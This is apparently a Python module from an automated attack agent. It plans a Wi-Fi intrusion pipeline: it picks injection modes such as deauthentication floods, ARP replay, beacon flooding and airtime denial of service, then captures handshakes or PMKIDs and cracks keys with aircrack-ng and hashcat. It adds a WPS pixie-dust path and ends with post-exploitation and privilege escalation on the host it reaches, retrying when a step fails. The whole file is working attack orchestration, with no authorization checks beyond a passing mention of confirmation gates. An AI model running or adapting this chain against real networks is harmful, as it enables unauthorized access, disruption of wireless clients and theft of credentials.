"""Offensive packet injection → access → privilege escalation pipeline.

All injection choices are **fully offensive** (not mere quality tests),
**polymorphically** ranked for the live target, and **re-picked** when
the target's behaviour / last result shows failure or adaptation need.

Phases (honest; never fabricates success)::

  1. observe   — encryption, PMF, clients, chipset, last inject outcome
  2. inject    — mode: deauth | arp_replay | fragmentation | chopchop |
                 fakeauth | beacon_flood | cts_rts | external tool
  3. capture   — airodump / hcxdumptool / PMKID path matched to mode
  4. crack     — offline hash when material exists
  5. post_exploit + privesc — sticky PE + privilege escalation poly order

ACCEPT gates still apply on destructive / PE steps at walk time.
"""
from __future__ import annotations

from typing import Any, Dict, List, Optional, Sequence, Set


# Injection modes ordered by typical aggressiveness / utility
INJECT_MODES = (
    "deauth",
    "arp_replay",
    "fragmentation",
    "chopchop",
    "fakeauth",
    "beacon_flood",
    "cts_rts",
)

# Privilege-escalation PE methods (post-foothold, polymorphic order)
PRIV_ESC_METHODS = (
    "linux_privesc_enum",
    "sudo_misconfig",
    "suid_gtfobins",
    "kernel_cve_check",
    "credential_reuse",
    "windows_privesc_enum",
    "token_impersonation",
    "service_path_hijack",
)


def observe_inject(
    target: Optional[Dict[str, Any]] = None,
    last_result: Optional[Dict[str, Any]] = None,
) -> Dict[str, Any]:
    """Live features relevant to offensive injection + PE chaining."""
    t = dict(target or {})
    lr = dict(last_result or {})
    data = lr.get("data") if isinstance(lr.get("data"), dict) else {}
    res = lr.get("result") if isinstance(lr.get("result"), dict) else {}
    enc = str(t.get("encryption") or t.get("enc") or data.get("encryption") or "")
    enc_u = enc.upper()
    caps = t.get("adapter_caps") if isinstance(t.get("adapter_caps"), dict) else {}
    clients = t.get("clients") or t.get("client_count") or data.get("clients") or 0
    if isinstance(clients, list):
        client_count = len(clients)
        stations = [
            (c.get("mac") or c.get("station") or c.get("addr") if isinstance(c, dict) else str(c))
            for c in clients[:8]
        ]
    elif isinstance(clients, dict):
        try:
            client_count = int((clients.get("data") or {}).get("count") or 0)
        except (TypeError, ValueError):
            client_count = 0
        stations = []
    else:
        try:
            client_count = int(clients or 0)
        except (TypeError, ValueError):
            client_count = 0
        stations = []

    args_lr = lr.get("args") if isinstance(lr.get("args"), dict) else {}
    last_mode = (
        res.get("mode")
        or data.get("mode")
        or lr.get("mode")
        or args_lr.get("mode")
    )
    failed = bool(
        lr.get("ok") is False
        or lr.get("failed")
        or res.get("ok") is False
        or (lr.get("error") or res.get("error"))
    )
    err = str(lr.get("error") or res.get("error") or data.get("error") or "")[:200]
    access = bool(
        (lr.get("access") or {}).get("achieved")
        if isinstance(lr.get("access"), dict)
        else lr.get("access_achieved") or t.get("access_achieved")
    )
    return {
        "bssid": t.get("bssid") or data.get("bssid"),
        "ssid": t.get("ssid") or t.get("essid") or data.get("ssid"),
        "channel": t.get("channel") or data.get("channel"),
        "interface": t.get("interface") or t.get("iface") or data.get("interface"),
        "encryption": enc,
        "is_wep": "WEP" in enc_u,
        "is_open": enc_u in ("", "OPEN", "OPN", "NONE", "?") or "OPEN" in enc_u,
        "is_wpa3": "WPA3" in enc_u or "SAE" in enc_u,
        "is_wpa2": "WPA2" in enc_u or ( "WPA" in enc_u and "WPA3" not in enc_u),
        "pmf": bool(t.get("pmf") or t.get("pmf_supported") or data.get("pmf")),
        "wps": bool(t.get("wps") or data.get("wps")),
        "client_count": client_count,
        "stations": stations,
        "injection_capable": bool(
            caps.get("injection_capable")
            or t.get("injection_capable")
            or data.get("injection_capable")
            or caps.get("mt7921e")
            or t.get("mt7921e")
        ),
        "mt7921e": bool(caps.get("mt7921e") or t.get("mt7921e")),
        "quality": caps.get("quality") if caps.get("quality") is not None else t.get("quality"),
        "last_mode": last_mode,
        "failed": failed,
        "error": err,
        "access": access,
        "has_creds": bool(
            t.get("psk") or t.get("password") or t.get("creds")
            or data.get("psk") or res.get("psk") or res.get("creds")
        ),
        "host_os": str(t.get("os") or t.get("host_os") or data.get("os") or "").lower(),
        "uid": t.get("uid") or data.get("uid"),
        "is_root": bool(
            str(t.get("uid") or data.get("uid") or "") in ("0", "root")
            or t.get("is_root") or data.get("is_root")
        ),
    }


def rank_inject_modes(
    feats: Dict[str, Any],
    *,
    exclude: Optional[Sequence[str]] = None,
) -> List[Dict[str, Any]]:
    """Polymorphic ranking of offensive inject modes for this target.

    Returns list of ``{mode, score, rationale, risk_level}`` highest first.
    PMF/SAE down-ranks classic deauth (ineffective / noisy) honestly.
    """
    ban: Set[str] = {str(x).lower() for x in (exclude or []) if x}
    ranked: List[Dict[str, Any]] = []

    def add(mode: str, score: float, rationale: str, risk: str = "destructive") -> None:
        if mode.lower() in ban:
            return
        ranked.append({
            "mode": mode,
            "score": score,
            "rationale": rationale,
            "risk_level": risk,
        })

    # WEP → IV harvest / keystream paths are primary offensive injects
    if feats.get("is_wep"):
        add("arp_replay", 100, "WEP — ARP replay for IV flood", "destructive")
        add("fragmentation", 90, "WEP — fragmentation keystream recovery", "destructive")
        add("chopchop", 85, "WEP — chopchop keystream recovery", "destructive")
        add("deauth", 40, "WEP — optional deauth if stations present", "destructive")

    # Open network — offensive association + captive/session pivot
    elif feats.get("is_open"):
        add("fakeauth", 80, "OPEN — fakeauth / associate to pivot", "intrusive")
        add("beacon_flood", 50, "OPEN — noise / evil beacon pressure", "destructive")
        add("deauth", 45, "OPEN — disrupt clients if present", "destructive")

    # WPA3 / PMF — do NOT pretend deauth wins; prefer capture / SAE plan
    elif feats.get("is_wpa3") or feats.get("pmf"):
        add("fakeauth", 55, "PMF/SAE — soft associate path (honest, no deauth claim)", "intrusive")
        add("cts_rts", 40, "PMF — airtime pressure probe (may be limited)", "destructive")
        # deauth kept low for honesty when transition mode might exist
        if not feats.get("pmf"):
            add("deauth", 30, "no PMF flag — try directed deauth", "destructive")
        else:
            add("deauth", 10, "PMF set — deauth likely ineffective; last resort only", "destructive")

    # Classic WPA/WPA2
    else:
        if (feats.get("client_count") or 0) > 0:
            add("deauth", 95, "WPA2 + clients — directed deauth for EAPOL", "destructive")
            add("cts_rts", 50, "airtime DoS to force reconnects", "destructive")
        else:
            add("fakeauth", 70, "clientless — fakeauth / PMKID path prep", "intrusive")
            add("deauth", 55, "broadcast deauth may wake sleeping STAs", "destructive")
        if feats.get("wps"):
            add("deauth", 90, "WPS present — deauth aids pixie/online paths", "destructive")

    # Failure rotation: demote last failed mode, boost alternate tool families
    last = (feats.get("last_mode") or "").lower()
    if feats.get("failed") and last:
        for row in ranked:
            if row["mode"] == last:
                row["score"] -= 40
                row["rationale"] += " (last attempt failed — deprioritized)"
            else:
                row["score"] += 15

    # Quality / chipset hints
    try:
        q = int(feats.get("quality")) if feats.get("quality") is not None else None
    except (TypeError, ValueError):
        q = None
    if q is not None and q < 30:
        for row in ranked:
            if row["mode"] == "deauth":
                row["score"] += 10
                row["rationale"] += " (low inject quality — prefer reliable deauth)"

    if not ranked:
        add("deauth", 50, "default offensive inject", "destructive")

    ranked.sort(key=lambda r: float(r.get("score") or 0), reverse=True)
    return ranked


def pick_inject_mode(
    target: Optional[Dict[str, Any]] = None,
    last_result: Optional[Dict[str, Any]] = None,
    *,
    exclude: Optional[Sequence[str]] = None,
) -> Dict[str, Any]:
    """Pick the best offensive inject mode for this live target."""
    feats = observe_inject(target, last_result)
    ranked = rank_inject_modes(feats, exclude=exclude)
    top = ranked[0] if ranked else {
        "mode": "deauth", "score": 0, "rationale": "fallback", "risk_level": "destructive",
    }
    station = None
    stations = feats.get("stations") or []
    if stations and top.get("mode") == "deauth":
        station = stations[0]
    return {
        "ok": True,
        "mode": top["mode"],
        "score": top.get("score"),
        "rationale": top.get("rationale"),
        "risk_level": top.get("risk_level") or "destructive",
        "station": station,
        "features": feats,
        "alternates": [r["mode"] for r in ranked[1:5]],
        "model": "offensive_inject_poly_v1",
    }


def pick_priv_esc(
    target: Optional[Dict[str, Any]] = None,
    last_result: Optional[Dict[str, Any]] = None,
    *,
    exclude: Optional[Sequence[str]] = None,
) -> Dict[str, Any]:
    """Polymorphic privilege-escalation method order after foothold."""
    feats = observe_inject(target, last_result)
    ban = {str(x).lower() for x in (exclude or []) if x}
    host = feats.get("host_os") or ""
    cands: List[Dict[str, Any]] = []

    if "win" in host:
        order = (
            "windows_privesc_enum",
            "token_impersonation",
            "service_path_hijack",
            "credential_reuse",
            "kernel_cve_check",
        )
    elif "android" in host:
        order = (
            "linux_privesc_enum",
            "suid_gtfobins",
            "credential_reuse",
            "kernel_cve_check",
        )
    else:
        # Linux / unknown — enum first then concrete paths
        order = (
            "linux_privesc_enum",
            "sudo_misconfig",
            "suid_gtfobins",
            "kernel_cve_check",
            "credential_reuse",
            "windows_privesc_enum",
        )

    if feats.get("is_root"):
        return {
            "ok": True,
            "method": "already_elevated",
            "rationale": "uid/root already elevated — skip privesc, harden/session only",
            "chain": [],
            "features": feats,
            "model": "offensive_priv_esc_poly_v1",
        }

    for m in order:
        if m.lower() in ban:
            continue
        cands.append({"method": m, "rationale": f"poly PE order for os={host or 'unknown'}"})

    primary = cands[0] if cands else {
        "method": "linux_privesc_enum",
        "rationale": "default PE enum",
    }
    return {
        "ok": True,
        "method": primary["method"],
        "rationale": primary["rationale"],
        "chain": [c["method"] for c in cands],
        "features": feats,
        "model": "offensive_priv_esc_poly_v1",
    }


def build_offensive_chain(
    target: Dict[str, Any],
    *,
    last_result: Optional[Dict[str, Any]] = None,
    exclude_modes: Optional[Sequence[str]] = None,
    attach_pe: bool = True,
    attach_priv_esc: bool = True,
) -> List[Dict[str, Any]]:
    """Full offensive steps: inject → capture → crack → PE → privesc.

    Steps are chain-planner shaped (action/tool/args/risk_level).
    Destructive PE remains ACCEPT-gated at walk time.
    """
    t = dict(target or {})
    pick = pick_inject_mode(t, last_result, exclude=exclude_modes)
    feats = pick.get("features") or observe_inject(t, last_result)
    bssid = feats.get("bssid") or t.get("bssid") or "TARGET_BSSID"
    channel = feats.get("channel") or t.get("channel") or 1
    iface = feats.get("interface") or t.get("interface") or t.get("iface") or "wlan0mon"
    ssid = feats.get("ssid") or t.get("ssid") or t.get("essid") or ""
    mode = pick.get("mode") or "deauth"
    station = pick.get("station")
    cap_path = f"/tmp/kfiosa-{str(bssid).replace(':', '')}-01.cap"
    steps: List[Dict[str, Any]] = []

    # 0) Optional quality probe only when mt7921e — still followed by real inject
    if feats.get("mt7921e"):
        steps.append({
            "action": "mt7921e_test_injection",
            "tool": "mt7921e_tools",
            "args": {"interface": iface},
            "rationale": "probe inject quality then immediately offensive mode",
            "expected_outcome": "quality 0-100; continue to offensive inject",
            "risk_level": "intrusive",
            "expected_runtime_seconds": 15,
            "poly": {"family": "inject_probe", "mode_next": mode},
        })

    # 1) Offensive inject (always when injection capable or always for wifi)
    inject_args: Dict[str, Any] = {
        "mode": mode,
        "bssid": bssid,
        "channel": channel,
        "interface": iface,
        "count": 32 if mode == "deauth" else 16,
        "ssid": ssid,
        "offensive": True,
        "poly_score": pick.get("score"),
    }
    if station:
        inject_args["station"] = station
    action = "mt7921e_inject" if feats.get("mt7921e") else "mt7921e_inject"
    # Prefer external_inject fallback meta for non-mt7921e
    if not feats.get("mt7921e") and feats.get("injection_capable"):
        inject_args["prefer_external"] = True
    steps.append({
        "action": action,
        "tool": "mt7921e_tools" if feats.get("mt7921e") else "wifi_inject",
        "args": inject_args,
        "rationale": (
            f"OFFENSIVE inject mode={mode}: {pick.get('rationale')} "
            f"(alternates={pick.get('alternates')})"
        ),
        "expected_outcome": "frames on air; force reauth / IV / associate pressure",
        "risk_level": pick.get("risk_level") or "destructive",
        "expected_runtime_seconds": 20,
        "poly": {
            "family": "offensive_inject",
            "mode": mode,
            "live_adapt": True,
            "alternates": pick.get("alternates") or [],
        },
    })

    # 2) Capture — matched to mode / crypto
    if feats.get("is_wep"):
        steps.append({
            "action": "mcp_call",
            "tool": "airodump-ng",
            "args": {
                "channel": channel, "bssid": bssid,
                "write": cap_path.replace("-01.cap", ""),
                "interface": iface, "output_format": "both",
            },
            "rationale": "WEP IV capture after arp/fragment/chopchop pressure",
            "expected_outcome": "enough IVs for aircrack",
            "risk_level": "intrusive",
            "expected_runtime_seconds": 60,
        })
        steps.append({
            "action": "crack",
            "tool": "aircrack-ng",
            "args": {"cap_file": cap_path, "wep": True, "bssid": bssid},
            "rationale": "WEP crack after offensive IV inject",
            "expected_outcome": "WEP key recovered",
            "risk_level": "intrusive",
            "expected_runtime_seconds": 120,
        })
    elif feats.get("is_wpa3") or feats.get("pmf"):
        steps.append({
            "action": "poly_adapt",
            "tool": "adapt_wpa3_sae_one_click_plan",
            "args": {
                "method": "adapt_wpa3_sae_one_click_plan",
                "bssid": bssid, "ssid": ssid, "channel": channel,
                "pmf": True, "encryption": feats.get("encryption"),
            },
            "rationale": "PMF/SAE — polymorphic SAE capture plan (no fake deauth win)",
            "expected_outcome": "SAE-aware capture steps",
            "risk_level": "read",
            "expected_runtime_seconds": 5,
        })
        steps.append({
            "action": "mcp_call",
            "tool": "airodump-ng",
            "args": {
                "channel": channel, "bssid": bssid,
                "write": cap_path.replace("-01.cap", ""),
                "interface": iface, "output_format": "both",
            },
            "rationale": "passive SAE/EAPOL capture while inject applies soft pressure",
            "expected_outcome": "SAE commit/confirm or transition EAPOL",
            "risk_level": "intrusive",
            "expected_runtime_seconds": 90,
        })
    else:
        # WPA2: PMKID if clientless, else handshake after deauth
        if (feats.get("client_count") or 0) == 0:
            steps.append({
                "action": "pmkid",
                "tool": "hcxdumptool",
                "args": {"bssid": bssid, "interface": iface, "channel": channel},
                "rationale": "clientless — PMKID after fakeauth/inject pressure",
                "expected_outcome": "PMKID hash file",
                "risk_level": "intrusive",
                "expected_runtime_seconds": 90,
            })
        steps.append({
            "action": "mcp_call",
            "tool": "airodump-ng",
            "args": {
                "channel": channel, "bssid": bssid,
                "write": cap_path.replace("-01.cap", ""),
                "interface": iface, "output_format": "both",
            },
            "rationale": "EAPOL handshake capture after offensive deauth/inject",
            "expected_outcome": "4-way handshake in .cap",
            "risk_level": "intrusive",
            "expected_runtime_seconds": 60,
        })
        steps.append({
            "action": "crack",
            "tool": "aircrack-ng",
            "args": {"cap_file": cap_path, "bssid": bssid, "wordlist": t.get("wordlist")},
            "rationale": "offline PSK crack after capture",
            "expected_outcome": "WPA PSK if in wordlist",
            "risk_level": "intrusive",
            "expected_runtime_seconds": 300,
        })
        steps.append({
            "action": "crack_gpu",
            "tool": "hashcat",
            "args": {"cap_file": cap_path, "bssid": bssid, "mask": t.get("mask") or "?d?d?d?d?d?d?d?d"},
            "rationale": "GPU mask fan-out when CPU wordlist fails",
            "expected_outcome": "PSK via hashcat if mask hits",
            "risk_level": "intrusive",
            "expected_runtime_seconds": 600,
            "optional": True,
        })

    if feats.get("wps") and not feats.get("is_wpa3"):
        steps.insert(1 if feats.get("mt7921e") else 0, {
            "action": "wps_pixie",
            "tool": "reaver",
            "args": {"bssid": bssid, "interface": iface, "channel": channel},
            "rationale": "WPS — pixie dust parallel offensive path",
            "expected_outcome": "WPS PIN + PSK",
            "risk_level": "intrusive",
            "expected_runtime_seconds": 120,
            "optional": True,
        })

    # 3) Post-exploit + privilege escalation (after access; gated at walk)
    if attach_pe:
        steps.append({
            "action": "post_exploit",
            "tool": "auto_post_exploit",
            "args": {
                "from_wifi": True,
                "bssid": bssid,
                "ssid": ssid,
                "polymorphic": True,
                "sticky_connection": True,
                "offensive_chain": True,
            },
            "rationale": "foothold → PE session, recon, sticky control plane",
            "expected_outcome": "post-access session + achievements",
            "risk_level": "destructive",
            "expected_runtime_seconds": 180,
            "optional": False,
        })
    if attach_priv_esc:
        pe_pick = pick_priv_esc(t, last_result)
        for i, method in enumerate(pe_pick.get("chain") or [pe_pick.get("method")]):
            if not method or method == "already_elevated":
                continue
            steps.append({
                "action": "post_exploit",
                "tool": method,
                "args": {
                    "method": method,
                    "polymorphic": True,
                    "privilege_escalation": True,
                    "order": i,
                    "host_os": feats.get("host_os") or t.get("os"),
                },
                "rationale": (
                    f"privilege escalation poly #{i}: {method} — "
                    f"{pe_pick.get('rationale')}"
                ),
                "expected_outcome": "elevated privileges if vuln present (honest degrade)",
                "risk_level": "destructive",
                "expected_runtime_seconds": 120,
                "optional": i > 0,  # first PE attempt required-ish; rest optional
                "poly": {
                    "family": "privilege_escalation",
                    "method": method,
                    "live_adapt": True,
                },
            })

    return steps


def react_inject(
    target: Dict[str, Any],
    last_result: Optional[Dict[str, Any]] = None,
    *,
    history_modes: Optional[Sequence[str]] = None,
) -> Dict[str, Any]:
    """Live-time reaction after an inject attempt.

    - failure → next offensive mode (exclude history)
    - access → privilege-escalation poly pick
    - success without access → capture/crack emphasis
    """
    feats = observe_inject(target, last_result)
    hist = list(history_modes or [])
    if feats.get("last_mode"):
        hist.append(str(feats["last_mode"]))

    if feats.get("access") or feats.get("has_creds"):
        pe = pick_priv_esc(target, last_result)
        return {
            "ok": True,
            "phase": "privilege_escalation",
            "pick": pe,
            "chain": build_offensive_chain(
                target, last_result=last_result,
                exclude_modes=hist, attach_pe=True, attach_priv_esc=True,
            )[-6:],  # PE tail
            "narrative": (
                f"Access/creds seen — shifting to PE/privesc poly "
                f"({pe.get('method')})"
            ),
        }

    if feats.get("failed"):
        nxt = pick_inject_mode(target, last_result, exclude=hist)
        return {
            "ok": True,
            "phase": "inject_retry",
            "pick": nxt,
            "chain": build_offensive_chain(
                target, last_result=last_result,
                exclude_modes=hist, attach_pe=True, attach_priv_esc=True,
            ),
            "narrative": (
                f"Inject failed ({feats.get('error') or 'error'}); "
                f"live-adapt → mode={nxt.get('mode')}"
            ),
        }

    # Inject seemed ok but no access yet — continue capture/crack, keep mode
    nxt = pick_inject_mode(target, last_result, exclude=[])
    return {
        "ok": True,
        "phase": "capture_crack",
        "pick": nxt,
        "chain": build_offensive_chain(
            target, last_result=last_result, attach_pe=True, attach_priv_esc=True,
        ),
        "narrative": (
            f"Inject mode={nxt.get('mode')} applied; pressing capture→crack→PE"
        ),
    }


def merge_offensive_prefix(
    steps: List[Dict[str, Any]],
    target: Dict[str, Any],
    *,
    last_result: Optional[Dict[str, Any]] = None,
) -> List[Dict[str, Any]]:
    """Ensure planned chain starts with live offensive inject path.

    Replaces soft test-only inject heads with full offensive chain head
    when injection is available; appends PE/privesc tail if missing.
    """
    t = dict(target or {})
    feats = observe_inject(t, last_result)
    offensive = build_offensive_chain(t, last_result=last_result)
    if not steps:
        return offensive

    # Detect if plan already has an offensive inject step
    has_off_inject = False
    for s in steps:
        if not isinstance(s, dict):
            continue
        action = str(s.get("action") or "")
        args = s.get("args") if isinstance(s.get("args"), dict) else {}
        if action in ("mt7921e_inject", "external_inject") and args.get("offensive"):
            has_off_inject = True
            break
        if action == "mt7921e_inject":
            # Upgrade existing inject to offensive poly mode
            pick = pick_inject_mode(t, last_result)
            args = dict(args)
            args.setdefault("mode", pick.get("mode") or "deauth")
            args["offensive"] = True
            args.setdefault("count", 32)
            s["args"] = args
            s["rationale"] = (
                (s.get("rationale") or "")
                + f" | OFFENSIVE poly mode={args.get('mode')}: {pick.get('rationale')}"
            )
            s.setdefault("risk_level", "destructive")
            s.setdefault("poly", {})["family"] = "offensive_inject"
            has_off_inject = True

    out = list(steps)
    if not has_off_inject and (
        feats.get("injection_capable") or feats.get("mt7921e") or t.get("domain") in (None, "wifi", "wlan")
    ):
        # Prepend inject + capture core (not full duplicate PE if already present)
        head = [s for s in offensive if (s.get("action") in (
            "mt7921e_test_injection", "mt7921e_inject", "external_inject",
        ) or (s.get("poly") or {}).get("family") == "offensive_inject")]
        if not head:
            head = offensive[:2]
        out = head + out

    # Ensure PE / priv esc tail
    has_pe = any(
        isinstance(s, dict) and (
            s.get("action") == "post_exploit"
            or (s.get("args") or {}).get("privilege_escalation")
        )
        for s in out
    )
    if not has_pe:
        tail = [
            s for s in offensive
            if s.get("action") == "post_exploit"
            or (s.get("args") or {}).get("privilege_escalation")
        ]
        out = out + tail
    return out
